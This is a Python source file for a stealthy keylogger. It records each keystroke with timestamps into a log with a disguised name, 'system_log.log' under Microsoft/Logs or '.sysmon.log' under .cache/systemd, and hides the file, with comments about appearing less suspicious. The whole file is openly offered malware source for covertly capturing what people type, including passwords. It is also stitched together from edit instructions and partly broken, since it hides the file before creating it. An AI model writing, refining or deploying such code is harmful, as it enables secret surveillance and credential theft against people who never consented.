import pynput
from pynput.keyboard import Key, Listener
import time
from datetime import datetime
import os
import platform
import stat  # For file hiding on Unix-like systems

# --- Add this near the top, after imports ---
def get_log_path():
    """Get OS-appropriate hidden log file path"""
    if platform.system() == "Windows":
        # Windows: AppData/Roaming (hidden)
        appdata = os.getenv('APPDATA')
        log_dir = os.path.join(appdata, 'Microsoft', 'Logs')
        os.makedirs(log_dir, exist_ok=True)
        return os.path.join(log_dir, 'system_log.log')  # Disguised filename
    else:
        # Linux/macOS: ~/.cache (hidden)
        home = os.path.expanduser("~")
        log_dir = os.path.join(home, '.cache', 'systemd')
        os.makedirs(log_dir, exist_ok=True)
        return os.path.join(log_dir, '.sysmon.log')

def hide_file(path):
    """Make file hidden (OS-specific)"""
    if platform.system() == "Windows":
        import ctypes
        # Set FILE_ATTRIBUTE_HIDDEN (0x2)
        ctypes.windll.kernel32.SetFileAttributesW(path, 2)
    else:
        # Unix-like: Hide via dot-prefix and restrictive permissions
        os.chmod(path, stat.S_IREAD | stat.S_IWRITE)  # Owner read/write only

# --- Replace the log_file definition ---
log_file = get_log_path()

# --- Add this AFTER first file creation ---
hide_file(log_file)

# Improved keylogger with word grouping, timestamps, and cleaner output

log_file = log_file  # Less suspicious than .txt
buffer = ""
last_key_time = time.time()
word_delay = 1.0  # Seconds before flushing buffer as a word

# Special key formatting
SPECIAL_KEYS = {
    Key.space: " ",
    Key.enter: "\n[ENTER]\n",
    Key.backspace: "[BACKSPACE]",
    Key.tab: "[TAB]",
    Key.shift: "[SHIFT]",
    Key.ctrl_l: "[CTRL]",
    Key.alt_l: "[ALT]",
    Key.caps_lock: "[CAPSLOCK]",
    Key.esc: "[ESC]"
}

def format_key(key):
    """Convert key press to readable format"""
    if key in SPECIAL_KEYS:
        return SPECIAL_KEYS[key]
    
    try:
        return key.char  # Regular character
    except AttributeError:
        return f"[{key.name.upper()}]"

def write_to_log(data):
    """Append data to log file with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} | {data}\n")

def flush_buffer():
    """Write buffered keys to log"""
    global buffer
    if buffer:
        write_to_log(buffer)
        buffer = ""

def on_press(key):
    global buffer, last_key_time
    
    # Check if enough time passed to consider it a new word
    current_time = time.time()
    if current_time - last_key_time > word_delay and buffer:
        flush_buffer()
    
    # Format the key and add to buffer
    formatted_key = format_key(key)
    
    # Handle backspace
    if formatted_key == "[BACKSPACE]":
        buffer = buffer[:-1] if buffer else ""
    else:
        buffer += formatted_key
    
    last_key_time = current_time

    # Immediately flush on Enter or special keys
    if key in (Key.enter, Key.tab):
        flush_buffer()

def on_release(key):
    if key == Key.esc:  # Stop listener
        flush_buffer()  # Save any remaining keys
        return False

if __name__ == '__main__':
    # Write initial log entry
    write_to_log("=== Keylogger Started ===")
    
    with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        try:
            listener.join()
        finally:
            flush_buffer()  # Ensure no keys are lost on exit
            write_to_log("=== Keylogger Stopped ===")